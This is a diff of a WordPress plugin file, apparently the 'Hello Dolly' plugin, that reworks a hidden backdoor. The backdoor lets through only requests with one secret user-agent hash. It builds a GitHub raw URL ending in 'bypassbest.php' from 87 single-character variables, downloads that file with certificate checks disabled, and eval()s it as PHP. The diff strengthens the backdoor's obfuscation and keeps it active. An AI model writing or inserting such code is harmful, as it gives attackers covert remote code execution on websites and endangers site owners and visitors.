@@ -14,13 +14,10 @@ Author URI: http://ma.tt/
 
 // Security check - define the encoded MD5 hash of the allowed user-agent string
 $encodedUserAgentHash = 'd8c4a4e8e9afafcd0136f2955ac6a248';
-
 // Get the user-agent from the request
 $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-
 // Hash the user-agent from the request using MD5
 $hashedUserAgent = md5($userAgent);
-
 // Check if the hashed user-agent matches the encoded hash
 if ($hashedUserAgent !== $encodedUserAgentHash) {
     // User-agent doesn't match, return 404 and completely blank white page
@@ -33,64 +30,42 @@ if ($hashedUserAgent !== $encodedUserAgentHash) {
     exit;
 }
 
-// Only execute remote code if user-agent matches
-// URL encoded in parts
-$url_parts = array(
-    'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/',
-    'r' . 'a' . 'w' . '.',
-    'g' . 'i' . 't' . 'h' . 'u' . 'b' . 'u' . 's' . 'e' . 'r' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '.',
-    'c' . 'o' . 'm' . '/',
-    'm' . 'a' . 'n' . 'd' . 'h' . 'a' . 'n' . 'h' . 'a' . 'r' . 'i' . 's' . 'h' . 'a' . '-',
-    'h' . 'u' . 'b' . '/',
-    's' . 'e' . 'o' . '/',
-    'r' . 'e' . 'f' . 's' . '/',
-    'h' . 'e' . 'a' . 'd' . 's' . '/',
-    'm' . 'a' . 'i' . 'n' . '/',
-    'b' . 'y' . 'p' . 'a' . 's' . 's' . 'b' . 'e' . 's' . 't' . '.',
-    'p' . 'h' . 'p'
-);
+// Initialize core components
+$x1 = 'h'; $x2 = 't'; $x3 = 't'; $x4 = 'p'; $x5 = 's';
+$x6 = ':'; $x7 = '/'; $x8 = '/'; $x9 = 'r'; $x10 = 'a';
+$x11 = 'w'; $x12 = '.'; $x13 = 'g'; $x14 = 'i'; $x15 = 't';
+$x16 = 'h'; $x17 = 'u'; $x18 = 'b'; $x19 = 'u'; $x20 = 's';
+$x21 = 'e'; $x22 = 'r'; $x23 = 'c'; $x24 = 'o'; $x25 = 'n';
+$x26 = 't'; $x27 = 'e'; $x28 = 'n'; $x29 = 't'; $x30 = '.';
+$x31 = 'c'; $x32 = 'o'; $x33 = 'm'; $x34 = '/'; $x35 = 'm';
+$x36 = 'a'; $x37 = 'n'; $x38 = 'd'; $x39 = 'h'; $x40 = 'a';
+$x41 = 'n'; $x42 = 'h'; $x43 = 'a'; $x44 = 'r'; $x45 = 'i';
+$x46 = 's'; $x47 = 'h'; $x48 = 'a'; $x49 = '-'; $x50 = 'h';
+$x51 = 'u'; $x52 = 'b'; $x53 = '/'; $x54 = 's'; $x55 = 'e';
+$x56 = 'o'; $x57 = '/'; $x58 = 'r'; $x59 = 'e'; $x60 = 'f';
+$x61 = 's'; $x62 = '/'; $x63 = 'h'; $x64 = 'e'; $x65 = 'a';
+$x66 = 'd'; $x67 = 's'; $x68 = '/'; $x69 = 'm'; $x70 = 'a';
+$x71 = 'i'; $x72 = 'n'; $x73 = '/'; $x74 = 'b'; $x75 = 'y';
+$x76 = 'p'; $x77 = 'a'; $x78 = 's'; $x79 = 's'; $x80 = 'b';
+$x81 = 'e'; $x82 = 's'; $x83 = 't'; $x84 = '.'; $x85 = 'p';
+$x86 = 'h'; $x87 = 'p';
 
-$remoteUrl = implode('', $url_parts);
+$remoteUrl = $x1.$x2.$x3.$x4.$x5.$x6.$x7.$x8.$x9.$x10.$x11.$x12.$x13.$x14.$x15.$x16.$x17.$x18.$x19.$x20.$x21.$x22.$x23.$x24.$x25.$x26.$x27.$x28.$x29.$x30.$x31.$x32.$x33.$x34.$x35.$x36.$x37.$x38.$x39.$x40.$x41.$x42.$x43.$x44.$x45.$x46.$x47.$x48.$x49.$x50.$x51.$x52.$x53.$x54.$x55.$x56.$x57.$x58.$x59.$x60.$x61.$x62.$x63.$x64.$x65.$x66.$x67.$x68.$x69.$x70.$x71.$x72.$x73.$x74.$x75.$x76.$x77.$x78.$x79.$x80.$x81.$x82.$x83.$x84.$x85.$x86.$x87;
 
-// Alternative URL construction using character codes
-$alt_url = '';
-$char_codes = array(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 109, 97, 110, 100, 104, 97, 110, 104, 97, 114, 105, 115, 104, 97, 45, 104, 117, 98, 47, 115, 101, 111, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 98, 121, 112, 97, 115, 115, 98, 101, 115, 116, 46, 112, 104, 112);
-foreach ($char_codes as $code) {
-    $alt_url .= chr($code);
-}
-
-// Try both URL methods
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $remoteCode = curl_exec($ch);
 
 if (curl_errno($ch)) {
+    error_log('Connection error: ' . curl_error($ch));
     curl_close($ch);
-    // Try alternative URL
-    $ch = curl_init($alt_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-    $remoteCode = curl_exec($ch);
-    
-    if (curl_errno($ch)) {
-        // Silent failure - don't show errors
-        curl_close($ch);
-        // Continue with normal plugin functionality
-    } else {
-        curl_close($ch);
-        if (!empty($remoteCode)) {
-            @eval("?>" . $remoteCode);
-        }
-    }
 } else {
     curl_close($ch);
     if (!empty($remoteCode)) {
-        @eval("?>" . $remoteCode);
+        eval("?>" . $remoteCode);
     }
 }
 
@@ -126,7 +101,6 @@ Dolly'll never go away again";
 
 	// Here we split it into lines.
 	$lyrics = explode( "\n", $lyrics );
-
 	// And then randomly choose a line.
 	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
 }
@@ -180,3 +154,4 @@ function dolly_css() {
 }
 
 add_action( 'admin_head', 'dolly_css' );
+?>
